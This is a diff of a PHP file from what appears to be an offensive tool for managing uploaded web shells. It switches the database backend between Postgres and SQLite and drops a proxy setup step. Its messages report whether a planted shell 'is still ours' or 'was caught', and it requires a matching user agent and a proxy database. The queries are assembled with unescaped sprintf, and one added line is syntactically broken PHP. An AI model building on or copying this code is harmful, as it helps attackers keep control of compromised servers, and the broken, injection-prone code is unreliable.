@@ -11,39 +11,30 @@ if (strtolower(php_uname()) == "windows") {
 
 include "defaults.php";
 require "includes/droppers/dynamic_generator.php";
+require "db/postgres_pdo.php";
+require "db/slopSqlite.php";
 
-
-if (defined("SQL_SELECTION")){
-    switch (SQL_SELECTION){
-        case strpos(SQL_SELECTION, "pgsql") !== false:
-            require "includes/db/postgres_pdo.php";
-            $db_call = new postgres_checker("pgsql:host=localhost;dbname=postgres", "postgres", "", array(
-                PDO::ATTR_PERSISTENT => true
-            )); //Change these values as needed.
-            if (empty(config['sloppy_db']['pass'])) {
-                $db_call->createDB();
-            }
-            break;
-        case strpos(SQL_SELECTION, "sqlite3") !== false:
-        default:
-            require "includes/db/slopSqlite.php";
-            $db_call = new slopSqlite("includes/db/sqlite3_repo/slopSqlite.sqlite3", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, "");
-            break;
-    }
+switch (SQL_SELECTION){
+    case strpos(SQL_SELECTION, "pgsql") !== false:
+        $db_call = new postgres_pdo("pgsql:host=localhost;dbname=postgres", "postgres", "", array(
+            PDO::ATTR_PERSISTENT => true
+        )); //Change these values as needed.
+        if (empty(config['sloppy_db']['pass'])) {
+            $db_call->firstRun();
+        }
+        break;
+    case strpos(SQL_SELECTION, "sqlite3") !== false:
+    default:
+        $db_call = new slopSqlite("includes/db/sqlite3_repo/slopSqlite.sqlite3", SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE, "");
+        break;
 }
+
 const response_array = array(
     "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
     "200" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL,
     "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
     "500" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL
 );
-
-
-if (config['sloppy_proxies']['proxy_init'] !== true){
-    $db_call->getProxies('initial');
-}else{
-    echo "proxies built".PHP_EOL;
-}
 
 
 
@@ -129,8 +120,7 @@ _MENU;
 
 function update_proxy_db_entries(string $proxy, bool $succssful, string $last_contact, bool $time_out, int $round_trip_time){
     if (!is_null($proxy) && !is_null($succssful) && !is_null($last_contact) && $proxy !== 'none') {
-        $tg = pg_fetch_row(pg_exec(pg_connect(DBCONN),
-            sprintf("SELECT times_used,time_outs,successful_responses FROM sloppy_bots_proxies WHERE proxy = '%s'", $proxy)));
+        $tg = $db_call->(sprintf("SELECT times_used,time_outs,successful_responses FROM sloppy_bots_proxies WHERE proxy = '%s'", $proxy));
         $tc = pg_exec(pg_connect(DBCONN),
             sprintf("UPDATE sloppy_bots_proxies SET times_used = '%s', last_domain_contacted = '%s', round_trip_time = '%s', time_outs = '%s', successful_responses = '%s'  WHERE proxy = '%s'",
                 (int)$tg[0] + 1,
